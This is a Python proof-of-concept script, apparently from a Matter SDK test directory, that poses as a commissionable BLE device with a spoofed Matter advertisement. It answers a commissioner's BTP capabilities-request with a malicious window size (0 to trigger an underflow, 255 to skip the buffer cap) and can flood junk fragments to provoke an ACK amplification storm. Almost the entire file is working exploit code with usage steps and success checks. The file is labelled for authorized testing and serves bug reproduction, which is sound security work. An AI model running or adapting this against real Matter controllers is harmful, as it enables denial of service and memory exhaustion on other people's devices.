#!/usr/bin/env python3
# Malicious-peripheral PoC for BTP Bug B (commissioner / controller side).
#
# The companion central-side PoC (btp_window_underflow_repro.py) tested
# Bug A: an attacker plays commissioner against a victim end-device. This
# script tests Bug B: an attacker plays a fake commissionable device and
# hands a hostile capabilities-RESPONSE to a victim commissioner.
#
# Bug B sits at src/ble/BLEEndPoint.cpp:1080:
#     mRemoteReceiveWindowSize = mLocalReceiveWindowSize =
#         mReceiveWindowMaxSize = resp.mWindowSize;
# Strictly worse than Bug A: there is not even a `std::min(...,
# BLE_MAX_RECEIVE_WINDOW_SIZE)` cap. So a hostile peripheral can hand
# the central:
#   - windowSize = 0  -> immediate underflow at line 1085
#   - windowSize = 255 -> central believes peer can buffer 255 unacked
#                         fragments; ~62 KB of pinned PacketBuffers per
#                         BLE link, no backpressure
#
# AUTHORIZED TESTING ONLY. Run only against commissioner builds you own
# (chip-tool, chip-repl, your own BLE central PoC). Do not advertise this
# at consumer Matter controllers.
#
# Usage
# -----
#   python3 -m pip install bless
#   python3 scripts/tests/btp_window_underflow_peripheral_repro.py \
#       --window-size 0
#
# Adapter conflict
# ----------------
# Linux BlueZ adapters are mode-exclusive. Running this script puts the
# adapter into peripheral mode; you cannot simultaneously use it as a
# central with bleak. To exercise Bug B end-to-end you need either:
#   - a second BLE adapter (USB dongle: hci1 for central, hci0 for this
#     peripheral, or vice-versa), OR
#   - two machines: this script on machine A, commissioner on machine B.
#
# Test workflow with chip-tool
# ----------------------------
# 1. Start this script. It registers a GATT service mimicking the Matter
#    BLE transport profile and advertises under `MATTER-3840`.
# 2. From the commissioner machine, run something like:
#       chip-tool pairing ble-wifi 1 my-ssid my-pass 20202021 3840
#    The commissioner will discover this script via the service UUID
#    0xFFF6, connect, write the BTP cap-request to CHAR_1, and subscribe
#    to CHAR_2 for the cap-response.
# 3. This script captures the cap-request and replies via CHAR_2 with a
#    cap-response carrying the attacker-chosen windowSize.
# 4. Observe the commissioner's logs / behavior:
#       - Does it recover (storm self-terminates)?
#       - Does it hang / freeze the commissioning flow?
#       - Does it allocate a noticeable amount of PacketBuffer memory
#         (windowSize=255 case, look for heap growth in MSAN/ASAN)?
#
# Note on Matter advertisement payload
# ------------------------------------
# Matter peripherals encode an 8-byte service-data blob in the AD packet
# (op-code + product/vendor IDs + discriminator). We DO populate the
# service UUID 0xFFF6 in the advertisement, but bless's interface for
# arbitrary service-data payload is patchy across versions. If your
# commissioner uses strict service-data filtering and refuses to discover
# us, fall back to connecting by MAC address directly. The BTP handshake
# itself does not depend on the service-data payload.

import argparse
import asyncio
import contextlib
import struct
import sys
from typing import Optional

try:
    from bless import (
        BlessServer,
        BlessGATTCharacteristic,
        GATTCharacteristicProperties,
        GATTAttributePermissions,
    )
except ImportError:
    print(
        "error: bless not importable from this interpreter "
        f"({sys.executable}).",
        file=sys.stderr,
    )
    print(
        "       install with: python3 -m pip install bless",
        file=sys.stderr,
    )
    sys.exit(2)

try:
    from dbus_fast.aio import MessageBus
    from dbus_fast.constants import BusType
    from dbus_fast.service import ServiceInterface, dbus_property, method
    from dbus_fast.signature import Variant
    from dbus_fast import PropertyAccess
except ImportError:
    print(
        "error: dbus-fast not importable. install with: python3 -m pip install dbus-fast",
        file=sys.stderr,
    )
    sys.exit(2)

MATTER_SVC_UUID = "0000fff6-0000-1000-8000-00805f9b34fb"
CHAR_1_UUID = "18ee2ef5-263d-4559-959f-4f9c429f9d11"  # central -> peripheral (write)
CHAR_2_UUID = "18ee2ef5-263d-4559-959f-4f9c429f9d12"  # peripheral -> central (indicate)


def build_cap_response(window_size: int, fragment_size: int = 244) -> bytes:
    """Build a 6-byte BTP capabilities-response.
    Layout (matches BleLayer.cpp:206-223):
      byte 0..1 : 0x65 0x6C  CAPABILITIES_MSG_CHECK_BYTE_1/2
      byte 2    : selected protocol version (4 = V4)
      byte 3..4 : mFragmentSize LE16
      byte 5    : mWindowSize  <-- attacker-controlled
    """
    return struct.pack("<BBBHB", 0x65, 0x6C, 0x04, fragment_size, window_size)


def build_btp_data_fragment(seq_num: int, payload: bytes = b"\x00") -> bytes:
    """Minimal BTP data fragment: kStartMessage|kEndMessage, no ACK.
    Layout (matches BtpEngine.cpp:450+ and BtpEngine.h:80-86):
      byte 0    : header flags (kStartMessage=0x01 | kEndMessage=0x04 = 0x05)
      byte 1    : sequence number
      byte 2..3 : total message length, LE16 (only present when kStartMessage)
      byte 4..  : payload bytes
    """
    header = 0x05  # kStartMessage | kEndMessage
    msg_len = len(payload)
    return struct.pack("<BBH", header, seq_num & 0xFF, msg_len) + payload


def parse_cap_request(payload: bytes) -> Optional[dict]:
    """Best-effort parse of a 9-byte BTP capabilities-request."""
    if len(payload) < 9 or payload[0] != 0x65 or payload[1] != 0x6C:
        return None
    return {
        "supported_versions": payload[2:6].hex(),
        "mtu": int.from_bytes(payload[6:8], "little"),
        "window_size": payload[8],
    }


def build_matter_service_data(discriminator: int, vendor_id: int = 0xFFF1, product_id: int = 0x8001) -> bytes:
    """Construct the 8-byte Matter BLE advertisement service-data blob.
    Layout (matches what chip-all-clusters-app emits and what
    src/platform/Linux/bluez/ChipDeviceScanner.cpp expects):
      byte 0    : opcode (0x00 = commissionable)
      byte 1..2 : discriminator (12 bits) | version (4 bits), LE16
      byte 3..4 : vendor ID, LE16
      byte 5..6 : product ID, LE16
      byte 7    : additional flags
    """
    disc_with_version = (discriminator & 0x0FFF) << 0  # version=0 in low nibble
    return struct.pack("<BHHHB", 0x00, disc_with_version, vendor_id, product_id, 0x00)


# org.bluez.LEAdvertisement1 implementation. We register this alongside
# bless's GATT app so the AD packet includes the Matter service-data
# blob (without it, chip-tool logs "does not look like a CHIP device"
# and skips us during discovery).
class MatterAdvertisement(ServiceInterface):
    def __init__(self, service_uuid: str, service_data: bytes, local_name: str):
        super().__init__("org.bluez.LEAdvertisement1")
        self._service_uuid = service_uuid
        self._service_data = service_data
        self._local_name = local_name

    @dbus_property(access=PropertyAccess.READ)
    def Type(self) -> "s":
        return "peripheral"

    @dbus_property(access=PropertyAccess.READ)
    def ServiceUUIDs(self) -> "as":
        return [self._service_uuid]

    @dbus_property(access=PropertyAccess.READ)
    def ServiceData(self) -> "a{sv}":
        return {self._service_uuid: Variant("ay", self._service_data)}

    @dbus_property(access=PropertyAccess.READ)
    def LocalName(self) -> "s":
        return self._local_name

    @dbus_property(access=PropertyAccess.READ)
    def IncludeTxPower(self) -> "b":
        return False

    @method()
    def Release(self):
        pass


async def register_matter_advertisement(discriminator: int, local_name: str):
    """Register a Matter-shaped LEAdvertisement1 with BlueZ over D-Bus."""
    bus = await MessageBus(bus_type=BusType.SYSTEM).connect()
    adv_path = "/org/bluez/example/advertisement0"
    advertisement = MatterAdvertisement(
        service_uuid=MATTER_SVC_UUID,
        service_data=build_matter_service_data(discriminator),
        local_name=local_name,
    )
    bus.export(adv_path, advertisement)

    introspection = await bus.introspect("org.bluez", "/org/bluez/hci0")
    adapter = bus.get_proxy_object("org.bluez", "/org/bluez/hci0", introspection)
    ad_mgr = adapter.get_interface("org.bluez.LEAdvertisingManager1")
    await ad_mgr.call_register_advertisement(adv_path, {})
    print(f"[+] Matter advertisement registered  service-data={build_matter_service_data(discriminator).hex()}")
    return bus  # keep alive


# Globals updated from the GATT write callback.
state = {
    "last_request": None,        # type: Optional[bytes]
    "write_event": None,         # type: Optional[asyncio.Event]
    "loop": None,                # type: Optional[asyncio.AbstractEventLoop]
    "post_handshake_writes": [], # type: list[bytes]
}


def on_read(characteristic: BlessGATTCharacteristic, **kwargs):
    return characteristic.value


def on_write(characteristic: BlessGATTCharacteristic, value: bytes, **kwargs):
    """GATT write callback. bless invokes this on a worker thread, so
    bridge back to the asyncio loop with call_soon_threadsafe."""
    payload = bytes(value)
    print(f"[*] central wrote to {characteristic.uuid}: {payload.hex()}  ({len(payload)}B)")
    if characteristic.uuid.lower() == CHAR_1_UUID:
        if state["last_request"] is None:
            # First write is the cap-request.
            state["last_request"] = payload
            if state["loop"] is not None and state["write_event"] is not None:
                state["loop"].call_soon_threadsafe(state["write_event"].set)
        else:
            # Post-handshake fragments. Count them; this is the
            # interesting signal for the windowSize=255 amplification
            # case — does the central spew fragments without backpressure?
            state["post_handshake_writes"].append(payload)


async def run(window_size: int, fragment_size: int, server_name: str,
              observe_seconds: float, flood_count: int, flood_interval_ms: int) -> int:
    state["loop"] = asyncio.get_running_loop()
    state["write_event"] = asyncio.Event()

    print(f"[*] creating BLE peripheral '{server_name}'")
    server = BlessServer(name=server_name)
    server.read_request_func = on_read
    server.write_request_func = on_write

    print(f"[*] adding service {MATTER_SVC_UUID}")
    await server.add_new_service(MATTER_SVC_UUID)

    write_props = (
        GATTCharacteristicProperties.write
        | GATTCharacteristicProperties.write_without_response
    )
    indicate_props = (
        GATTCharacteristicProperties.indicate
        | GATTCharacteristicProperties.read
    )
    print(f"[*] adding characteristic CHAR_1 (write)    {CHAR_1_UUID}")
    await server.add_new_characteristic(
        MATTER_SVC_UUID, CHAR_1_UUID,
        write_props, b"", GATTAttributePermissions.writeable,
    )
    print(f"[*] adding characteristic CHAR_2 (indicate) {CHAR_2_UUID}")
    await server.add_new_characteristic(
        MATTER_SVC_UUID, CHAR_2_UUID,
        indicate_props, b"", GATTAttributePermissions.readable,
    )

    print(f"[*] starting peripheral, advertising windowSize={window_size}, fragmentSize={fragment_size}")
    await server.start()

    # bless's default advertisement only includes the service UUID, which
    # makes chip-tool skip us with "does not look like a CHIP device".
    # Register a parallel LEAdvertisement1 with the Matter 8-byte
    # service-data blob so chip-tool's discriminator filter accepts us.
    try:
        adv_bus = await register_matter_advertisement(discriminator=3840, local_name=server_name)
    except Exception as e:
        print(f"[!] warning: failed to register Matter advertisement: {e}")
        print(f"    Discovery may fail. Connect by MAC directly if needed.")
        adv_bus = None

    print("[+] peripheral live. Waiting for commissioner to connect and write cap-request...")
    print("    (commissioner test: `chip-tool pairing ble-wifi 1 ssid pass 20202021 3840`)")

    try:
        await asyncio.wait_for(state["write_event"].wait(), timeout=300.0)
    except asyncio.TimeoutError:
        print("[-] no cap-request received within 5 minutes, giving up")
        await server.stop()
        return 1

    parsed = parse_cap_request(state["last_request"])
    print(f"[+] received cap-request: {state['last_request'].hex()}")
    print(f"    parsed: {parsed}")

    cap_resp = build_cap_response(window_size, fragment_size)
    print(f"[*] indicating malicious cap-response: {cap_resp.hex()}  (windowSize={window_size})")
    server.get_characteristic(CHAR_2_UUID).value = cap_resp
    indication_ok = server.update_value(MATTER_SVC_UUID, CHAR_2_UUID)
    print(f"    update_value returned {indication_ok!r}")

    n_before = len(state["post_handshake_writes"])

    if flood_count > 0:
        # Drag the central's mLocalReceiveWindowSize down toward the immediate-
        # ACK threshold by feeding it junk BTP data fragments. With
        # windowSize=2 in the cap-response, every flood fragment should
        # trigger a stand-alone ACK back from the central — that's the
        # bandwidth-amplification storm.
        print(f"[*] flooding {flood_count} junk BTP data fragments at "
              f"{flood_interval_ms}ms intervals (seq 0..{(flood_count - 1) % 256})...")
        sent = 0
        for i in range(flood_count):
            seq = i & 0xFF
            frag = build_btp_data_fragment(seq, b"\x00")
            server.get_characteristic(CHAR_2_UUID).value = frag
            ok = server.update_value(MATTER_SVC_UUID, CHAR_2_UUID)
            if not ok:
                print(f"    fragment #{i} (seq={seq}): update_value=False, stopping")
                break
            sent += 1
            await asyncio.sleep(flood_interval_ms / 1000)
        print(f"[*] sent {sent} flood fragments")

    print(f"[*] holding link {observe_seconds}s and counting post-handshake activity from central...")
    await asyncio.sleep(observe_seconds)
    n_after = len(state["post_handshake_writes"])
    extra = n_after - n_before
    elapsed = (flood_count * flood_interval_ms / 1000) + observe_seconds
    rate = extra / elapsed if elapsed else 0.0
    total_bytes = sum(len(b) for b in state["post_handshake_writes"][n_before:n_after])

    print(f"[*] post-handshake writes from central: {extra} ({rate:.1f}/s, {total_bytes}B total)")
    if flood_count > 0 and extra >= max(3, flood_count // 4):
        print("[!] STORM CONFIRMED: central is sending stand-alone ACKs in response")
        print(f"    to our flood. {extra} ACK frames received against {flood_count}")
        print("    flood fragments. The bandwidth-amplification primitive from")
        print("    BleConfig.h:155-159 is reachable on this commissioner build.")
    elif window_size == 255 and total_bytes > 4 * fragment_size:
        print("[!] AMPLIFICATION CONFIRMED: central queued fragments past a sane window.")
    elif extra >= 2:
        print("[!] central kept writing post-handshake — possible ACK storm or")
        print("    central treating us as normal peer despite the bad window.")
    elif extra == 0:
        print("[+] central went quiet. Likely either:")
        print("      - central detected garbage and tore down (not vulnerable), or")
        print("      - central's transport hit EPIPE-style self-bound (Linux backend).")

    await server.stop()
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Bug B: malicious-peripheral PoC for BTP receive-window underflow / no-cap.",
    )
    parser.add_argument(
        "--window-size", type=int, default=0,
        help="malicious resp.mWindowSize (0..255). 0 → underflow, 255 → no-cap amplification.",
    )
    parser.add_argument(
        "--fragment-size", type=int, default=244,
        help="cap-response mFragmentSize (default 244, the BTP max).",
    )
    parser.add_argument(
        "--server-name", default="MATTER-3840",
        help="GATT server name advertised over BLE.",
    )
    parser.add_argument(
        "--observe-seconds", type=float, default=15.0,
        help="seconds to hold the link after the cap-response, watching for central activity.",
    )
    parser.add_argument(
        "--flood", type=int, default=0,
        help=("after the cap-response, send this many junk BTP data fragments "
              "to drain the central's mLocalReceiveWindowSize. With "
              "--window-size 2 each fragment should trigger a stand-alone ACK "
              "from the central (bandwidth-amplification storm). With "
              "--window-size 0 the line-1085 underflow puts mLocalReceiveWindowSize "
              "above threshold so the storm self-bounds; for the storm proper "
              "use --window-size 2."),
    )
    parser.add_argument(
        "--flood-interval-ms", type=int, default=50,
        help="ms between flood fragments. Lower = faster storm, higher = more reliable on slow links.",
    )
    args = parser.parse_args()

    if not 0 <= args.window_size <= 255:
        parser.error("--window-size must be 0..255")
    if not 0 < args.fragment_size <= 244:
        parser.error("--fragment-size must be 1..244")

    try:
        return asyncio.run(run(
            args.window_size, args.fragment_size,
            args.server_name, args.observe_seconds,
            args.flood, args.flood_interval_ms,
        ))
    except KeyboardInterrupt:
        return 130


if __name__ == "__main__":
    sys.exit(main())
